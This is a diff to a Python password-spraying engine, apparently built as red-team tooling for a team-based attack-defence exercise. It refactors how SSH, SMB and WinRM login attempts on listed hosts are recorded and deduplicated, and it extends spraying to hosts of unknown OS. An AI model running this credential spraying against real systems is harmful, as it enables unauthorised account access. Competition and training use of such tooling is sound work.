@@ -19,7 +19,7 @@ import socket
 import subprocess
 import sys
 import time
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from datetime import datetime
 from pathlib import Path
 from typing import Dict, List, Optional, Tuple
@@ -31,6 +31,7 @@ if str(ROOT_DIR) not in sys.path:
     sys.path.insert(0, str(ROOT_DIR))
 
 from lib.common import attempt_install, find_missing_binaries, get_install_hints, get_log_dir, resolve_team_numbers
+from lib.operations import TARGETS, Target
 
 
 # Configuration
@@ -42,27 +43,8 @@ class Credentials:
     password: str
     domain: str = ""
 
-@dataclass
-class Target:
-    hostname: str
-    host_id: int
-    os_type: str
-    services: List[str] = field(default_factory=list)
-    
-    def get_wan_ip(self, team_num: int) -> str:
-        return f"192.168.{200 + team_num}.{self.host_id}"
-
-# In-scope targets with services
-TARGETS = [
-    Target("curiosity", 140, "windows", ["smb", "winrm", "rdp"]),
-    Target("morality", 10, "windows", ["smb", "winrm", "rdp", "http"]),
-    Target("anger", 70, "windows", ["smb", "winrm", "rdp", "dns"]),
-    Target("space", 141, "windows", ["smb", "winrm", "rdp"]),
-    Target("scalable", 73, "linux", ["ssh", "http"]),
-    Target("safety", 12, "linux", ["ssh", "http", "ftp"]),
-    Target("storage", 14, "linux", ["ssh", "http", "mysql"]),
-    Target("cake", 143, "linux", ["ssh", "http"]),
-]
+# Targets are loaded from lib.operations.TARGETS, which can be overridden
+# via the APERTURE_TARGETS_FILE environment variable or config/targets.json.
 
 
 def parse_targets(choice: str) -> List[Target]:
@@ -403,34 +385,56 @@ class SprayEngine:
             "winrm": [],
         }
         self.lock = threading.Lock()
+        self.seen = set()
+
+    def _format_creds(self, creds: Credentials, include_domain: bool) -> str:
+        if include_domain and creds.domain:
+            return f"{creds.domain}\\{creds.username}:{creds.password}"
+        return f"{creds.username}:{creds.password}"
+
+    def _record_result(
+        self,
+        service: str,
+        team_num: int,
+        target: Target,
+        ip: str,
+        creds: Credentials,
+        message: str,
+        include_domain: bool,
+    ) -> None:
+        creds_label = self._format_creds(creds, include_domain)
+        key = (service, team_num, target.hostname, ip, creds_label)
+        with self.lock:
+            if key in self.seen:
+                return
+            self.seen.add(key)
+            self.results[service].append(
+                {
+                    "team": team_num,
+                    "target": target.hostname,
+                    "ip": ip,
+                    "service": service,
+                    "creds": creds_label,
+                    "message": message,
+                }
+            )
     
     def spray_target(self, team_num: int, target: Target, creds: Credentials) -> List[Dict]:
         """Spray a single target with credentials"""
-        results = []
-        wan_ip = target.get_wan_ip(team_num)
+        wan_ip = target.wan_ip(team_num)
         logger.info(
             f"[Team {team_num}] Testing {target.hostname} ({wan_ip}) with {creds.username} ({target.os_type})."
         )
         
         # SSH
-        if target.os_type == "linux":
+        if target.os_type in {"linux", "unknown"}:
             success, msg = SSHSpray.spray(wan_ip, creds)
             if success:
-                result = {
-                    "team": team_num,
-                    "target": target.hostname,
-                    "ip": wan_ip,
-                    "service": "ssh",
-                    "creds": f"{creds.username}:{creds.password}",
-                    "message": msg
-                }
-                results.append(result)
-                with self.lock:
-                    self.results["ssh"].append(result)
+                self._record_result("ssh", team_num, target, wan_ip, creds, msg, include_domain=False)
                 logger.info(f"[Team {team_num}] SSH SUCCESS on {target.hostname}: {creds.username}")
         
         # SMB
-        if target.os_type == "windows":
+        if target.os_type in {"windows", "unknown"}:
             success, msg = SMBSpray.spray_cme(wan_ip, creds)
             if not success and "Missing binaries" in msg:
                 logger.warning(f"[Team {team_num}] SMB skipped on {target.hostname}: {msg}")
@@ -439,36 +443,16 @@ class SprayEngine:
                 if fallback_success:
                     success, msg = fallback_success, fallback_msg
             if success:
-                result = {
-                    "team": team_num,
-                    "target": target.hostname,
-                    "ip": wan_ip,
-                    "service": "smb",
-                    "creds": f"{creds.username}:{creds.password}",
-                    "message": msg
-                }
-                results.append(result)
-                with self.lock:
-                    self.results["smb"].append(result)
+                self._record_result("smb", team_num, target, wan_ip, creds, msg, include_domain=True)
                 logger.info(f"[Team {team_num}] SMB SUCCESS on {target.hostname}: {creds.username}")
         
         # WinRM
-        if target.os_type == "windows":
+        if target.os_type in {"windows", "unknown"}:
             success, msg = WinRMSpray.spray(wan_ip, creds)
             if not success and "Missing binaries" in msg:
                 logger.warning(f"[Team {team_num}] WinRM skipped on {target.hostname}: {msg}")
             if success:
-                result = {
-                    "team": team_num,
-                    "target": target.hostname,
-                    "ip": wan_ip,
-                    "service": "winrm",
-                    "creds": f"{creds.username}:{creds.password}",
-                    "message": msg
-                }
-                results.append(result)
-                with self.lock:
-                    self.results["winrm"].append(result)
+                self._record_result("winrm", team_num, target, wan_ip, creds, msg, include_domain=True)
                 logger.info(f"[Team {team_num}] WinRM SUCCESS on {target.hostname}: {creds.username}")
         
     def run_spray(self, creds_list: List[Credentials] = None) -> Dict:
@@ -538,8 +522,13 @@ class SprayEngine:
                 for team in sorted(by_team.keys()):
                     team_hits = by_team[team]
                     report.append(f"  Team {team}:")
+                    seen_lines = set()
                     for hit in team_hits:
-                        report.append(f"    - {hit['target']} ({hit['ip']}): {hit['creds']}")
+                        line = f"    - {hit['target']} ({hit['ip']}): {hit['creds']}"
+                        if line in seen_lines:
+                            continue
+                        seen_lines.add(line)
+                        report.append(line)
         
         # Overall summary
         total_hits = sum(len(hits) for hits in self.results.values())
@@ -636,7 +625,7 @@ Examples:
         for team_num in teams:
             print(f"\n=== Team {team_num} ===")
             for target in targets:
-                wan_ip = target.get_wan_ip(team_num)
+                wan_ip = target.wan_ip(team_num)
                 logger.info(f"Scanning {target.hostname} ({wan_ip}) for open services.")
                 services = scan_services(wan_ip)
                 open_services = [s for s, v in services.items() if v]
